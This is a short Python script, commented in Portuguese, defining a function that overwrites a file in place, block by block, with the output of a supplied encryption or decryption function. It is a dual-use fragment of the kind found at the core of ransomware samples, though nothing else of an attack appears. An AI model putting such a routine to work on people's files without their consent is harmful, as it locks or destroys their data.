#!/usr/bin/python3

#Função para criptografar e descriptografar os arquivos
def change_files(filename, cryptoFn, block_size=16):

    with open(filename, 'r+b') as _file: #Abre os arquivos com permissão de escrita em binário (read + binary)
        raw_value = _file.read(block_size)
        while raw_value: #Criptografia do arquivo
            cipher_value = cryptoFn(raw_value)
            if len(raw_value) != len(cipher_value):
                raise ValueError ('O valor cifrado é diferente do valor em texto pleno!')

            #Inicia a encriptação
            _file.seek(-len(raw_value), 1) #Vai para a posição de ponteiro especificada
            _file.write(cipher_value) #Escreve na posição
            raw_value = _file.read(block_size)